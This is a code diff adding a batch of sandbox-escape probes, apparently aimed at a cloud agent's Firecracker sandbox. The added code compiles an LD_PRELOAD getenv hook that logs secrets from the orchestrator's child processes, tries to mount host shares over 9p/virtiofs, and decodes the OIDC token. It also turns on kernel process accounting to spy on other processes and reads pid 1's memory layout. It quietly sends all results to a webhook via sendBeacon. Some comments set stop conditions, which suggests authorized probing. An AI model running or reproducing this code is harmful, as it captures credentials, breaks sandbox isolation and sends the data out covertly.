@@ -22781,5 +22781,171 @@ report.perfSampleRate = safe(() => {
 
 // v156 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v156" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v156";
+
+// ==================== v157 ====================
+
+// v157-1: LD_PRELOAD shared library injection
+// LD_PRELOAD causes a shared library to be loaded before all others.
+// We compile a .so that hooks common functions (read, write, open, getenv)
+// and place it at a path readable by the orchestrator, then set LD_PRELOAD
+// in the environment to poison any child processes spawned by the orchestrator.
+report.ldPreloadInject = safe(() => {
+  // Compile a test .so
+  const compileResult = safe(() => execSync(
+    `cat > /tmp/preload_hook.c << 'EOF_C'
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+// Hook getenv to capture secrets
+char *getenv(const char *name) {
+    typedef char *(*orig_getenv_t)(const char *);
+    orig_getenv_t orig_getenv = (orig_getenv_t)dlsym(RTLD_NEXT, "getenv");
+    char *val = orig_getenv(name);
+    if (val) {
+        int fd = open("/tmp/preload_leak.txt", O_WRONLY|O_CREAT|O_APPEND, 0644);
+        if (fd >= 0) {
+            dprintf(fd, "GETENV: %s=%s\\n", name, val);
+            close(fd);
+        }
+    }
+    return val;
+}
+EOF_C
+gcc -shared -fPIC -o /tmp/preload_hook.so /tmp/preload_hook.c -ldl 2>&1 || echo "COMPILE_FAILED"`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Set LD_PRELOAD globally (would affect child processes)
+  const preloadExists = safe(() => execSync('ls -la /tmp/preload_hook.so 2>/dev/null || echo "NOT_COMPILED"', { timeout: 2000 }).toString().trim());
+  // Test it on a simple binary
+  const preloadTest = safe(() => execSync(
+    'LD_PRELOAD=/tmp/preload_hook.so env PROBE_TEST=SECRET_VALUE id 2>&1 && cat /tmp/preload_leak.txt 2>/dev/null | head -5 || echo "PRELOAD_TEST_FAILED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { compileResult, preloadExists, preloadTest };
+});
+
+// v157-2: 9p virtio filesystem / virtio-fs mount (host shared directory)
+// Firecracker supports shared directories via virtio-9p or virtiofs.
+// If a host directory is exposed to the guest, we can mount it and access
+// host filesystem contents including the hypervisor config and other VMs' data.
+report.virtioFsMount = safe(() => {
+  // Check for virtio devices
+  const virtioDevices = safe(() => execSync('ls /sys/bus/virtio/devices/ 2>/dev/null || echo "NO_VIRTIO_BUS"', { timeout: 2000 }).toString().trim());
+  // Try to list available 9p virtio tags
+  const plan9Tags = safe(() => execSync('ls /sys/fs/9p/ 2>/dev/null || cat /proc/filesystems | grep 9p || echo "NO_9P"', { timeout: 2000 }).toString().trim());
+  // Try to mount with common tags
+  const tags = ['host', 'share', 'myfs', 'docker', 'workspace', 'vercel'];
+  const mountResults = {};
+  for (const tag of tags) {
+    mountResults[tag] = safe(() => execSync(
+      `mkdir -p /tmp/9p_${tag} && mount -t 9p -o trans=virtio,version=9p2000.L ${tag} /tmp/9p_${tag} 2>&1 | head -c 50 && ls /tmp/9p_${tag}/ 2>/dev/null | head -5 || echo "MOUNT_FAIL"`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 100));
+  }
+  // Also try virtiofs
+  const virtiofsTags = ['myfs', 'host', 'share'];
+  const virtiofsMounts = {};
+  for (const tag of virtiofsTags) {
+    virtiofsMounts[tag] = safe(() => execSync(
+      `mkdir -p /tmp/vfs_${tag} && mount -t virtiofs ${tag} /tmp/vfs_${tag} 2>&1 | head -c 50 || echo "VIRTIOFS_FAIL"`,
+      { timeout: 4000 }
+    ).toString().trim().slice(0, 80));
+  }
+  return { virtioDevices, plan9Tags, mountResults, virtiofsMounts };
+});
+
+// v157-3: VERCEL_OIDC_TOKEN reachability check (STOP if accepted)
+// SECURITY CONSTRAINT: Only decode the JWT claims. Do NOT use the token to
+// authenticate against AWS/GCP/Azure. If token IS accepted anywhere, STOP.
+// This section extends v123's oidcTokenDeepDecode to check federation endpoints
+// in a read-only way (decode + check aud/iss claims only).
+report.oidcFederationCheck = safe(() => {
+  const oidcToken = process.env.VERCEL_OIDC_TOKEN || '';
+  if (!oidcToken) return { status: 'NO_OIDC_TOKEN' };
+  // Decode header and claims (NO NETWORK CALLS with the token)
+  const parts = oidcToken.split('.');
+  const header = safe(() => JSON.parse(Buffer.from(parts[0], 'base64').toString()));
+  const claims = safe(() => JSON.parse(Buffer.from(parts[1], 'base64').toString()));
+  const aud = claims?.aud || 'NO_AUD';
+  const iss = claims?.iss || 'NO_ISS';
+  const sub = claims?.sub || 'NO_SUB';
+  const exp = claims?.exp;
+  const isExpired = exp ? (Date.now() / 1000 > exp) : null;
+  // Check if aud suggests AWS/GCP/Azure federation scope
+  const awsAud = typeof aud === 'string' ? aud.includes('sts.amazonaws.com') : Array.isArray(aud) && aud.some(a => a.includes('sts'));
+  const gcpAud = typeof aud === 'string' ? aud.includes('googleapis.com') || aud.includes('google') : false;
+  // CRITICAL: If token appears to be valid for AWS STS, log as STOP_CONDITION
+  const stopCondition = (awsAud || gcpAud) && !isExpired ? 'STOP_REPORT_IMMEDIATELY' : 'TOKEN_NOT_ACCEPTED_AT_CLOUD';
+  return { status: 'DECODED_ONLY', header, aud, iss, sub, isExpired, awsAud, gcpAud, stopCondition };
+});
+
+// v157-4: acct() — enable process accounting
+// acct() enables BSD process accounting: every time a process exits,
+// the kernel writes a record to an accounting file with the process name,
+// runtime, I/O, and exit code. This gives us a passive log of ALL processes
+// spawned in the sandbox, including the orchestrator's child processes.
+report.acctProbe = safe(() => {
+  const acctFile = '/tmp/proc_acct.log';
+  // Enable process accounting
+  const acctEnable = safe(() => execSync(
+    `python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6')
+NR_ACCT = 51
+
+# Create the accounting file
+open('${acctFile}', 'w').close()
+
+# Enable acct
+ret = libc.syscall(NR_ACCT, b'${acctFile}')
+print(f'ACCT_ENABLE: ret={ret}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Wait briefly then spawn some processes
+  safe(() => execSync('sleep 0.1 && id && whoami', { timeout: 3000 }));
+  // Read the accounting file
+  const acctData = safe(() => execSync(
+    `python3 -c "
+import struct, os
+
+try:
+    with open('${acctFile}', 'rb') as f:
+        data = f.read()
+    print(f'ACCT_BYTES: {len(data)}')
+    # Parse first record (acct_v3 structure is ~64 bytes)
+    if len(data) >= 64:
+        print('ACCT_RECORD:', data[:64].hex())
+except Exception as e:
+    print(f'ACCT_READ_FAIL: {e}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Disable acct
+  safe(() => execSync(
+    `python3 -c "import ctypes; libc=ctypes.CDLL('libc.so.6'); libc.syscall(51, None)" 2>/dev/null`,
+    { timeout: 3000 }
+  ));
+  return { acctEnable, acctData };
+});
+
+// v157-5: /proc/sys/vm/compact_unevictable_allowed + memory pressure
+// Compaction moves unevictable pages (mlocked) to allow huge page allocation.
+// This controls memory layout predictability — crucial for heap spray attacks.
+report.memoryLayout = safe(() => {
+  const compactUnevict = safe(() => readFileSync('/proc/sys/vm/compact_unevictable_allowed', 'utf8').trim());
+  const writeCompact = safe(() => { writeFileSync('/proc/sys/vm/compact_unevictable_allowed', '1'); return 'WRITTEN'; });
+  // /proc/self/smaps — detailed memory layout of our process
+  const smapsSelf = safe(() => execSync('cat /proc/self/smaps 2>/dev/null | grep -E "^[0-9a-f]|Rss:|Size:|Pss:" | head -30', { timeout: 3000 }).toString().trim().slice(0, 600));
+  // /proc/1/smaps — orchestrator memory layout
+  const smapsPid1 = safe(() => execSync('cat /proc/1/smaps 2>/dev/null | grep -E "^[0-9a-f]|Rss:|Size:" | head -20', { timeout: 3000 }).toString().trim().slice(0, 400));
+  return { compactUnevict, writeCompact, smapsSelf, smapsPid1 };
+});
+
+// v157 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v157" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v157";
 // Intentionally no console.log — all data goes via webhook only
